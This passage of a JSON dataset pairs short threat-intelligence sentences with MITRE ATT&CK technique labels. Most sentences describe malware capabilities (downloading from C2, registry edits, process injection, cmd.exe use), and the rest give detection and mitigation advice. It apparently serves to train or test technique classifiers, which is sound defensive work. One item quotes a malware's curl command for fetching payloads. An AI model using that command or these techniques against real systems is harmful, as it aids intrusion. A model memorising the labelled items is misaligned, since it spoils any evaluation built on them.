    "text": "Hancitor has the ability to download additional files from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Hancitor has used CallWindowProc and EnumResourceTypesA to interpret and execute shellcode.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "NanoCore has the capability to edit the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "NanoCore gathers the IP address from the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Aria-body has the ability to gather metadata from a file and to search for file and directory names.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Aria-body has the ability to download additional payloads from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Aria-body has the ability to launch files using ShellExecute.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Aria-body has the ability to enumerate loaded modules for a process.[1].",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Aria-body has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Aria-body has the ability to identify the hostname, computer name, Windows version, processor speed, machine GUID, and disk information on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Aria-body has the ability to identify the location, public IP address, and domain name on a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Aria-body has the ability to identify the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Remexi searches for files on the system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Remexi executes received commands with wmic.exe (for WMI commands).",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Pysa has modified the registry key \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" and added the ransom note.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Pysa can perform network reconnaissance using the Advanced IP Scanner tool.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Carbanak checks the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings for proxy configurations information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Pupy can list the running processes and get the process ID and parent process’s ID.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Pupy can grab a system’s information including the OS version, architecture, etc.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Pupy has built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected sessions.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "WastedLocker can enumerate files and directories just prior to encryption.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "WastedLocker can modify registry values within the Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry key.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "WastedLocker's custom crypter, CryptOne, leveraged the VirtualAlloc() API function to help execute the payload.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "WastedLocker checks for specific registry keys related to the UCOMIEnumConnections and IActiveScriptParseProcedure32 interfaces.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "BackConfig has the ability to identify folders and files related to previous infections.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BackConfig can download and execute additional payloads on a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BackConfig can leverage API functions such as ShellExecuteA and HttpOpenRequestA in the process of downloading and executing files.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "BackConfig has the ability to gather the victim's computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BoomBox can search for specific files and directories on a machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BoomBox has the ability to download next stage malware components to a compromised system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BoomBox can enumerate the hostname, domain, and IP of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BoomBox can enumerate the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "NavRAT uses tasklist /v to check running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "NavRAT uses systeminfo on a victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BADFLICK has uploaded files from victims' machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "BADFLICK has searched for files on the infected host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BADFLICK has download files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BADFLICK has captured victim computer name, memory space, and CPU details.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BADFLICK has captured victim IP address details.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "JSS Loader has the ability to download malicious executables to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "TYPEFRAME can search directories for files on the victim’s machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "TYPEFRAME can upload and download files to the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "TYPEFRAME can install encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "NETEAGLE allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure).",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns ( monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
    "command": "",
    "labels": [
      "T1033",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor network data for uncommon data flows.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
    "command": "",
    "labels": [
      "T1033",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Correlate other security systems with login information (, a user has an active login session but has not entered the building or does not have VPN access).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (, domain or enterprise administrator) to bypass access controls set within the enterprise.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Ensure that applications do not store sensitive data or credentials insecurely.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "( plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "When possible, applications that use SSH keys should be updated periodically and properly secured.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Regularly audit user accounts for activity and deactivate or remove any that are no longer needed.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Train users to only accept valid push notifications and to report suspicious push notifications.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly constructed logon behavior that may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for an attempt by a user that may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly constructed logon behavior across default accounts that have been activated or logged into.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for an attempt by a user to gain access to a network or computing resource, often by providing credentials",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Domain accounts can cover users, administrators, and services.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "MFA can also be used to restrict access to cloud resources and APIs.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Audit domain account permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Limit credential overlap across systems to prevent access if account credentials are obtained.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for suspicious account behavior across systems that share accounts, either user, admin, or service accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for an attempt by a user to gain access to a network or computing resource, often by the use of domain authentication services, such as the System Security Services Daemon (sssd) on Linux",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Local Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Ensure that local administrator accounts have complex, unique passwords across all systems on the network.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Audit local accounts permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "These audits should check if new local accounts are created that have not be authorized.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Implementing LAPS may help prevent reuse of local administrator credentials across a domain.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a Trusted Relationship.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Similar to Domain Accounts, compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Once a cloud account is compromised, an adversary may perform Account Manipulation - for example, by adding Additional Cloud Roles - to maintain persistence and potentially escalate their privileges.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Use multi-factor authentication for cloud accounts, especially privileged accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This can be implemented in a variety of forms ( hardware, virtual, SMS), and can also be audited using administrative reporting features.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Ensure that cloud accounts, particularly privileged accounts, have complex, unique passwords across all systems on the network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Passwords and access keys should be rotated regularly.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This limits the amount of time credentials can be used to access resources if a credential is compromised without your knowledge.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Cloud service providers may track access key age to help audit and identify keys that may need to be rotated.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Review privileged cloud account permission levels routinely to look for those that could allow an adversary to gain wide access.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "These reviews should also check if new privileged cloud accounts have been created that were not authorized.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Periodically review user accounts and remove those that are inactive or unnecessary.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Limit the ability for user accounts to create additional accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for suspicious account behavior across cloud services that share account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Monitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Use application control where appropriate.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for any attempts to enable scripts running on a system would be considered suspicious.",
    "command": "",
    "labels": [
      "T1005",
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious.",
    "command": "",
    "labels": [
      "T1005",
      "T1016",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Scripts should be captured from the file system when possible to determine their actions and intent.",
    "command": "",
    "labels": [
      "T1005",
      "T1016",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may abuse the Windows command shell for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The Windows command shell (cmd) is the primary command prompt on Windows systems.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The command prompt can be invoked remotely via Remote Services such as SSH.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may leverage cmd to execute various commands and payloads.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "An APT28 loader Trojan uses a cmd.exe and batch script to run its payload.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "An APT3 downloader uses the Windows command \"cmd.exe\" /C whoami.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "APT41 used cmd.exe /c to execute commands on remote machines.APT41 used a batch file to install persistence for the Cobalt Strike BEACON loader.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Group has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The group has used an exploit toolkit known as Threadkit that launches .bat files.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "FIN8 has also executed commands remotely via cmd.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Gamaredon Group has used various batch scripts to establish C2 and download additional files.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Gamaredon Group's backdoor malware has also been written to a batch file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "One version of Helminth uses batch scripting.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Several commands are supported by the Honeybee's implant via the command-line interface and there’s also a utility to execute any custom command on an infected endpoint.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Honeybee used batch scripting.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Koadic performs most of its operations using Windows Script Host (Jscript) and to run arbitrary shellcode.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group malware uses cmd.exe to execute commands on a compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The group has used a modified version of pentesting script wmiexec.vbs to execute commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "NavRAT leverages cmd.exe to perform discovery techniques.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "OceanSalt can create a reverse shell on the infected endpoint using cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "OilRig has used macros to deliver malware such as QUADAGENT and OopsIE.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "OilRig has used batch scripts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Orz can execute commands with JavaScript.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Patchwork used JavaScript code and .SCT files on victim machines.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Pisloader uses cmd.exe to set the Registry Run key value.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "RedLeaves can receive and execute commands with cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Sakula calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments that may abuse the Windows command shell for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly executed processes that may abuse the Windows command shell for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "OSX/Shlayer uses the curl -fsL \"$url\" >$tmp_path command to download malicious payloads into a temporary directory.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes.",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Look for DLLs that are not recognized or not normally loaded into a process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Native API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This may allow API callers to execute a binary, run a CLI command, load modules, as thousands of similar API functions exist for various system operations.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may abuse these OS API functions as a means of executing behaviors.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via Disable or Modify Tools).",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "BADNEWS has a command to download an .exe and execute it via CreateProcess API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Bankshot creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Denis used the IsDebuggerPresent, OutputDebugString, and SetLastError APIs to avoid debugging.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Denis used GetProcAddress and LoadLibrary to dynamically resolve APIs.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Denis also used the Wow64SetThreadContext API as part of a process hollowing process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
